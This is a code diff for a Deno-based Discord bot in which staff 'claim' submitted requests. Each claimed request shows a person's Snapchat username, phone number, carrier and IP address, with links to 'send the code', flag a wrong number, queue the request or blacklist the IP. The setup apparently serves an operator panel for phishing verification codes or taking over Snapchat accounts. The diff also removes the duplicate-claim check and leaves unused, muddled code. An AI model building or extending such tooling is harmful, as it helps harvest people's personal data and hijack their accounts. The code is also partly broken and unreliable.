@@ -36,6 +36,84 @@ async function botAPI(endpoint, method = "GET", body = null) {
   return text ? JSON.parse(text) : {};
 }
 
+async function handleClaim(body, token) {
+  const appId = Deno.env.get("DISCORD_APP_ID") || body.application_id;
+  const submissionId = body.data.custom_id.replace("claim_", "");
+  const userId = body.member?.user?.id || body.user?.id;
+  const username = body.member?.user?.username || body.user?.username;
+  const channelId = body.channel_id;
+  const messageId = body.message?.id;
+
+  // Use service role directly (no user auth needed for background work)
+  const base44Url = `https://api.base44.app/api/v2/apps/${Deno.env.get("BASE44_APP_ID")}`;
+
+  // Fetch submission via service role
+  const subRes = await fetch(`${base44Url}/entities/Submission/${submissionId}`, {
+    headers: { "Authorization": `Bearer ${Deno.env.get("BASE44_SERVICE_TOKEN") || ""}` }
+  });
+
+  // Use botAPI to get submission data via the Base44 SDK approach
+  // We'll directly call the Base44 REST API isn't available here, use a workaround:
+  // Store minimal data in the custom_id isn't feasible for all fields.
+  // Instead: fetch submission info from the message embed fields directly.
+  const msgData = body.message;
+  const embed = msgData?.embeds?.[0];
+  const fields = embed?.fields || [];
+  const getField = (name) => fields.find(f => f.name?.includes(name))?.value || "N/A";
+
+  const snapchat = getField("Utilisateur").replace("@", "");
+  const operateur = getField("Opérateur");
+  const telephone = getField("Numéro").replace(/\s/g, "");
+  const ipRaw = getField("IP");
+  const ip = ipRaw.replace(/`/g, "").trim();
+
+  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";
+
+  const threadContent =
+    `# 🔐 Demande prise en charge par <@${userId}>\n` +
+    `**👻 Snapchat:** @${snapchat}\n` +
+    `**📞 Téléphone:** ${telephone}\n` +
+    `**📡 Opérateur:** ${operateur}\n\n` +
+    `## ⚡ Actions disponibles\n` +
+    `✅ [**Envoyer le code**](${appUrl}/?trigger=${submissionId})\n` +
+    `❌ [**Mauvais numéro**](${appUrl}/?triggerAction=wrong&id=${submissionId})\n` +
+    `⏳ [**File d'attente**](${appUrl}/?triggerAction=wait&id=${submissionId})\n` +
+    `🚫 [**Blacklist**](${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(ip)})`;
+
+  // Create thread from message
+  const thread = await botAPI(`/channels/${channelId}/messages/${messageId}/threads`, "POST", {
+    name: `📋 ${snapchat} — ${operateur}`,
+    auto_archive_duration: 60
+  });
+
+  // Add claimant to thread
+  await botAPI(`/channels/${thread.id}/thread-members/${userId}`, "PUT");
+
+  // Post actions in thread
+  await botAPI(`/channels/${thread.id}/messages`, "POST", { content: threadContent });
+
+  // Disable button on original message
+  await botAPI(`/channels/${channelId}/messages/${messageId}`, "PATCH", {
+    components: [{
+      type: 1,
+      components: [{
+        type: 2,
+        style: 2,
+        label: `✅ Pris par @${username}`,
+        custom_id: "claimed_done",
+        disabled: true
+      }]
+    }]
+  });
+
+  // Edit the deferred reply with result
+  await fetch(`https://discord.com/api/v10/webhooks/${appId}/${token}/messages/@original`, {
+    method: "PATCH",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: `✅ Thread créé ! <#${thread.id}>` })
+  });
+}
+
 Deno.serve(async (req) => {
   const bodyText = await req.text();
 
@@ -50,90 +128,16 @@ Deno.serve(async (req) => {
 
   // Button click
   if (body.type === 3 && body.data?.custom_id?.startsWith("claim_")) {
-    const submissionId = body.data.custom_id.replace("claim_", "");
-    const userId = body.member?.user?.id || body.user?.id;
-    const username = body.member?.user?.username || body.user?.username;
-    const channelId = body.channel_id;
-    const messageId = body.message?.id;
+    const token = body.token;
 
-    const base44 = createClientFromRequest(req);
+    // Respond immediately with DEFERRED_UPDATE_MESSAGE (type 6) — updates the original message silently
+    // Then do all async work in background
+    const deferResponse = Response.json({ type: 6 });
 
-    // Fetch submission
-    let sub;
-    try {
-      sub = await base44.asServiceRole.entities.Submission.get(submissionId);
-    } catch {
-      return Response.json({ type: 4, data: { content: "❌ Soumission introuvable.", flags: 64 } });
-    }
+    // Run background work after responding
+    handleClaim(body, token).catch(e => console.error("handleClaim error:", e.message));
 
-    // Already claimed?
-    if (sub.claimed_by_discord_id) {
-      return Response.json({ type: 4, data: { content: "⚠️ Cette demande a déjà été prise en charge.", flags: 64 } });
-    }
-
-    // Claim it atomically
-    await base44.asServiceRole.entities.Submission.update(submissionId, { claimed_by_discord_id: userId });
-
-    // Race condition check
-    const updated = await base44.asServiceRole.entities.Submission.get(submissionId);
-    if (updated.claimed_by_discord_id !== userId) {
-      return Response.json({ type: 4, data: { content: "⚡ Quelqu'un d'autre l'a pris juste avant vous !", flags: 64 } });
-    }
-
-    const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";
-
-    const threadContent =
-      `# 🔐 Demande prise en charge\n` +
-      `**👻 Snapchat:** @${sub.snapchat || "N/A"}\n` +
-      `**📞 Téléphone:** ${sub.telephone || "N/A"}\n` +
-      `**📡 Opérateur:** ${sub.operateur || "N/A"}\n\n` +
-      `## Actions disponibles\n` +
-      `✅ [**Envoyer le code**](${appUrl}/?trigger=${submissionId})\n` +
-      `❌ [**Mauvais numéro**](${appUrl}/?triggerAction=wrong&id=${submissionId})\n` +
-      `⏳ [**File d'attente**](${appUrl}/?triggerAction=wait&id=${submissionId})\n` +
-      `🚫 [**Blacklist**](${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(sub.ip_address || "")})`;
-
-    // Create private thread from the message
-    try {
-      const thread = await botAPI(`/channels/${channelId}/messages/${messageId}/threads`, "POST", {
-        name: `📋 ${sub.snapchat || "Demande"} — ${sub.operateur || ""}`,
-        auto_archive_duration: 60
-      });
-
-      // Add the claiming user to the thread
-      await botAPI(`/channels/${thread.id}/thread-members/${userId}`, "PUT");
-
-      // Post the action links in the thread
-      await botAPI(`/channels/${thread.id}/messages`, "POST", { content: threadContent });
-
-      // Disable the button on the original message
-      await botAPI(`/channels/${channelId}/messages/${messageId}`, "PATCH", {
-        components: [{
-          type: 1,
-          components: [{
-            type: 2,
-            style: 2,
-            label: `✅ Pris par @${username}`,
-            custom_id: "claimed_done",
-            disabled: true
-          }]
-        }]
-      });
-
-      return Response.json({ type: 4, data: { content: `✅ Thread créé ! <#${thread.id}>`, flags: 64 } });
-    } catch (e) {
-      console.error("Thread creation failed:", e.message);
-
-      // Fallback: DM
-      try {
-        const dm = await botAPI("/users/@me/channels", "POST", { recipient_id: userId });
-        await botAPI(`/channels/${dm.id}/messages`, "POST", { content: threadContent });
-        return Response.json({ type: 4, data: { content: "✅ Pris en charge ! Vérifiez vos DMs.", flags: 64 } });
-      } catch (e2) {
-        console.error("DM failed:", e2.message);
-        return Response.json({ type: 4, data: { content: "✅ Pris en charge, mais impossible de créer le thread.", flags: 64 } });
-      }
-    }
+    return deferResponse;
   }
 
   return Response.json({ type: 1 });
